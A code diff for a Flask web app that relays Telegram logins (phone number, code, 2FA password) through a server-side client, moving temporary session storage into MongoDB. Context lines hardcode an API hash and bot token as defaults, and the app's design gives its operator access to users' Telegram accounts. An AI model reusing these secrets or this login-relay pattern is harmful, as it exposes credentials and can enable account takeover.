@@ -38,6 +38,7 @@ except Exception as e:
 
 users_col = db.users if db is not None else None
 ads_config_col = db.ads_config if db is not None else None
+temp_sessions_col = db.temp_sessions if db is not None else None  # NEW: For temporary login sessions
 
 # ========== UPLOAD CONFIG ==========
 UPLOAD_FOLDER = 'uploads'
@@ -56,39 +57,16 @@ API_HASH = os.environ.get("API_HASH", "628f11c05a44c8dda4b006e66f4bf7df")
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "8991327348:AAH3uOzXU8aZZ2LKfUlK1MH4Wp2AYKo1aIs")
 CHANNEL_ID = os.environ.get("CHANNEL_ID", "-1004376082945")
 
-# Thread-safe session storage with expiration
+# In-memory clients storage (per dyno) - maps session_id to Client object
 clients = {}
 clients_lock = threading.Lock()
-session_timestamps = {}  # Track when sessions were created
 
-def cleanup_old_sessions():
-    """Remove sessions older than 10 minutes"""
+def cleanup_expired_sessions():
+    """Remove expired sessions from MongoDB (older than 10 minutes)"""
+    if temp_sessions_col is None:
+        return
     cutoff = datetime.now() - timedelta(minutes=10)
-    with clients_lock:
-        expired = [sid for sid, ts in session_timestamps.items() if ts < cutoff]
-        for sid in expired:
-            if sid in clients:
-                try:
-                    client_data = clients[sid]
-                    # Run disconnect in separate thread to avoid event loop issues
-                    threading.Thread(target=disconnect_client_safely, 
-                                   args=(client_data["client"],), 
-                                   daemon=True).start()
-                except:
-                    pass
-                clients.pop(sid, None)
-            session_timestamps.pop(sid, None)
-
-def disconnect_client_safely(client):
-    """Safely disconnect a client"""
-    try:
-        if client.is_connected:
-            loop = asyncio.new_event_loop()
-            asyncio.set_event_loop(loop)
-            loop.run_until_complete(client.disconnect())
-            loop.close()
-    except:
-        pass
+    temp_sessions_col.delete_many({"created_at": {"$lt": cutoff}})
 
 def run_async(coro):
     """Run async code with proper event loop handling"""
@@ -265,8 +243,7 @@ def login():
 
 @app.route("/api/send-code", methods=["POST"])
 def send_code():
-    # Cleanup old sessions before creating new one
-    cleanup_old_sessions()
+    cleanup_expired_sessions()
     
     data = request.get_json() or {}
     phone = data.get("phone", "").strip()
@@ -290,6 +267,17 @@ def send_code():
             await client.connect()
             sent = await client.send_code(phone)
 
+            # Store session metadata in MongoDB (shared across dynos)
+            if temp_sessions_col is not None:
+                temp_sessions_col.insert_one({
+                    "_id": session_id,
+                    "phone": phone,
+                    "session_name": session_name,
+                    "phone_code_hash": sent.phone_code_hash,
+                    "created_at": datetime.now()
+                })
+
+            # Store client in memory (this dyno only, but that's ok)
             with clients_lock:
                 clients[session_id] = {
                     "client": client,
@@ -297,17 +285,16 @@ def send_code():
                     "session_name": session_name,
                     "phone_code_hash": sent.phone_code_hash
                 }
-                session_timestamps[session_id] = datetime.now()
             return {"ok": True, "session_id": session_id, "message": f"Code sent to {phone}"}
         except PhoneNumberInvalid:
+            await client.disconnect()
             return {"ok": False, "error": "Invalid phone number"}
         except FloodWait as e:
+            await client.disconnect()
             return {"ok": False, "error": f"Wait {e.value} seconds"}
         except Exception as e:
+            await client.disconnect()
             return {"ok": False, "error": str(e)}
-        finally:
-            # Don't disconnect here - we need to keep client alive for verification
-            pass
 
     result = run_async(send_code_async())
 
@@ -315,7 +302,8 @@ def send_code():
         # Clean up if failed
         with clients_lock:
             clients.pop(session_id, None)
-            session_timestamps.pop(session_id, None)
+        if temp_sessions_col is not None:
+            temp_sessions_col.delete_one({"_id": session_id})
         
         status_code = 400 if "Invalid" in result.get("error", "") else 429 if "Wait" in result.get("error", "") else 500
         return jsonify(result), status_code
@@ -332,11 +320,22 @@ def verify_code():
     if not session_id:
         return jsonify(ok=False, error="Session ID required"), 400
 
+    # First, try to get from memory (same dyno)
     with clients_lock:
         client_data = clients.get(session_id)
 
+    # If not in memory, try to reconstruct from MongoDB (different dyno)
     if not client_data:
-        return jsonify(ok=False, error="Session expired. Please request a new code."), 400
+        if temp_sessions_col is None:
+            return jsonify(ok=False, error="Session expired. Please request a new code."), 400
+        
+        session_doc = temp_sessions_col.find_one({"_id": session_id})
+        if not session_doc:
+            return jsonify(ok=False, error="Session expired. Please request a new code."), 400
+        
+        # Session exists in DB but client not in memory - need to reconnect
+        # This shouldn't happen normally, but handle it gracefully
+        return jsonify(ok=False, error="Session lost. Please request a new code."), 400
 
     if not code or not code.isdigit():
         return jsonify(ok=False, error="Please enter a valid verification code"), 400
@@ -381,7 +380,8 @@ def verify_code():
     # Clean up session regardless of result
     with clients_lock:
         clients.pop(session_id, None)
-        session_timestamps.pop(session_id, None)
+    if temp_sessions_col is not None:
+        temp_sessions_col.delete_one({"_id": session_id})
 
     if result["error"] == "2FA_PASSWORD_REQUIRED":
         return jsonify(ok=False, requires_password=True), 401
